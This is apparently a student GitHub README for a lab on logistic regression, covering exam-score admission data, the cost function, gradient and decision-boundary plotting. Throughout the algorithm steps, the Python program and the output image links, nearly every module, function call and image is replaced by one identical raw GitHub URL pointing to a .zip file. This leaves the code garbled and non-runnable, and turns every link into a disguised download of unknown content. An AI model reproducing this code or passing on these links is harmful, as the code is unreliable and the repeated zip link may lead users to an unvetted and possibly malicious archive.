# Implementation-of-Logistic-Regression-Using-Gradient-Descent

## AIM:
To write a program to implement the the Logistic Regression Using Gradient Descent.

## Equipments Required:
1. Hardware – PCs
2. Anaconda – Python 3.7 Installation / Jupyter notebook

## Algorithm
https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip the packages required.
https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip the dataset.
https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip X and Y array.
https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip a function for costFunction,cost and gradient.
https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip a function to plot the decision boundary and predict the Regression value.

## Program:
/*
Program to implement the the Logistic Regression Using Gradient Descent.
Developed by: SHAIK MUFEEZUR RAHAMAN
RegisterNumber:212221043007
*/
import numpy as np
import https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip as plt
from scipy import optimize

data = https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip("https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip",delimiter = ',')
X = data[:,[0,1]]
y = data[:,2]

X[:5]

y[:5]

https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip()
https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(X[y==1][:,0],X[y==1][:,1],label="Admitted")
https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(X[y==0][:,0],X[y==0][:,1],label="Not Admitted")
https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip("Exam 1 Score")
https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip("Exam 2 Score")
https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip()
https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip()

def sigmoid(z):
    return 1 / (1 + https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(-z))
    
https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip()
X_plot = https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(-10,10,100)
https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(X_plot,sigmoid(X_plot))
https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip()

def costFunction(theta,X,y):
    h = sigmoid(https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(X,theta))
    J = -(https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(y, https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(h)) + https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(1 - y,https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(1-h))) / https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip[0]
    grad = https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(X.T, h - y) / https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip[0]
    return J,grad
    
X_train = https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip((https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip((https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip[0],1)), X))
theta = https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip([0,0,0])
J,grad = costFunction(theta,X_train,y)
print(J)
print(grad)

X_train = https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip((https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip((https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip[0],1)), X))
theta = https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip([-24,0.2,0.2])
J,grad = costFunction(theta,X_train,y)
print(J)
print(grad)

def cost(theta,X,y):
    h = sigmoid(https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(X,theta))
    J = -(https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(y, https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(h)) + https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(1 - y, https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(1 - h))) / https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip[0]
    return J
def gradient(theta,X,y):
    h = sigmoid(https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(X,theta))
    grad = https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(X.T,h-y)https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip[0]
    return grad
X_train = https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip((https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip((https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip[0], 1)), X))
theta  = https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip([0,0,0])
res = https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(fun=cost, x0=theta, args=(X_train, y),method='Newton-CG', jac=gradient)
print(https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip)
print(res.x)

def plotDecisionBoundary(theta,X,y):
    x_min, x_max = X[:, 0].min() - 1,X[:, 0].max() + 1
    y_min, y_max = X[:, 1].min() - 1,X[:, 1].max() + 1
    xx, yy = https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(x_min,x_max, 0.1),https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(y_min,y_max, 0.1))
    X_plot = np.c_[https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(), https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip()]
    X_plot = https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip((https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip((https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip[0],1)),X_plot))
    y_plot = https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(X_plot,theta).reshape(https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip)
    
    https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip()
    https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(X[y==1][:,0],X[y==1][:,1],label="Admitted")
    https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(X[y==0][:,0],X[y==0][:,1],label="Not Admitted")
    https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(xx,yy,y_plot,levels=[0])
    https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip("Exam 1 Score")
    https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip("Exam 2 Score")
    https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip()
    https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip()


plotDecisionBoundary(res.x,X,y)

prob = sigmoid(https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip([1,45,85]),res.x))
print(prob)

def predict(theta, X):
    X_train = https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip((https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip((https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip[0], 1)),X))
    prob = sigmoid(https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(X_train,theta))
    return (prob>=0.5).astype(int)
    
https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip(predict(res.x,X) == y)

## Output:
![271906102-04447526-9230-4d43-a37b-153034f4dc14](https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip)

![271906114-0b9a727c-ec6d-4e70-866c-d3f55049c042](https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip)

![271906129-8ad779ea-5490-4839-9aac-92fe0e0853de](https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip)

![271906135-09505d40-a04c-462b-9f3d-e5abf89c1177](https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip)

![271906148-429cf876-9731-41fc-83e6-18f471705eb4](https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip)

![271906160-30e2985c-ab4d-4597-84ec-5e0f690dcc96](https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip)

![271906178-9f14bfc9-008d-44d9-b3ae-1eb8e418328e](https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip)

![271906199-542173b5-07cf-43ab-a9cd-21416db5f273](https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip)

![271906221-25abce13-7b43-424d-b9ca-61c5320e62a0](https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip)

![271906237-6d585b69-e29d-425c-878d-1e08b5c63a37](https://raw.githubusercontent.com/githubmufeez45/-Implementation-of-Logistic-Regression-Using-Gradient-Descent/main/pedantic/-Implementation-of-Logistic-Regression-Using-Gradient-Descent.zip)

## Result:
Thus the program to implement the the Logistic Regression Using Gradient Descent is written and verified using python programming.

